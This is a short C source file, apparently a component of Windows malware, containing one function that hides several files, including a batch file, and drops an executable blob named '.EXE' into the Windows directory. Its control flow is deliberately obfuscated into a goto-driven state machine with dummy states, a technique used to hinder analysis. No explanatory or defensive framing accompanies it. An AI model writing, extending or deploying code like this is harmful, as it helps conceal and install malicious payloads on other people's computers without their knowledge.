#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>
#include <string.h>

void _HideFiles(void)
{
    volatile int dummy_state = 1;
    HANDLE hFile;

dummy_dispatcher:
    if (dummy_state == 1) goto block1;
    if (dummy_state == 2) goto block2;
    if (dummy_state == 3) goto block3;
    if (dummy_state == 4) goto block4;
    if (dummy_state == 5) goto block5;
    if (dummy_state == 6) goto block6;
    if (dummy_state == 7) goto block7;
    if (dummy_state == 8) goto block8;
    if (dummy_state == 0) goto end;

block1:
    SetFileAttributesA(_windoze2, FILE_ATTRIBUTE_HIDDEN);
    dummy_state = 2;
    goto dummy_dispatcher;

block2:
    SetFileAttributesA(_sysdoze2, FILE_ATTRIBUTE_HIDDEN);
    dummy_state = 3;
    goto dummy_dispatcher;

block3:
    _chdir(_windir);
    dummy_state = 4;
    goto dummy_dispatcher;

block4:
    SetFileAttributesA("BBbLWDB.Bat", FILE_ATTRIBUTE_HIDDEN);
    dummy_state = 5;
    goto dummy_dispatcher;

block5:
    strcpy(_L0NEPath, _windir);
    dummy_state = 6;
    goto dummy_dispatcher;

block6:
    strcat(_L0NEPath, "\\.EXE");
    dummy_state = 7;
    goto dummy_dispatcher;

block7:
    hFile = CreateFileA(_L0NEPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    dummy_state = 8;
    goto dummy_dispatcher;

block8:
    WriteFile(hFile, _L0NEInc, sizeof(_L0NEInc), NULL, NULL);
    CloseHandle(hFile);
    dummy_state = 0;
    goto dummy_dispatcher;

end:
    return;
}
#pragma optimize("", on)
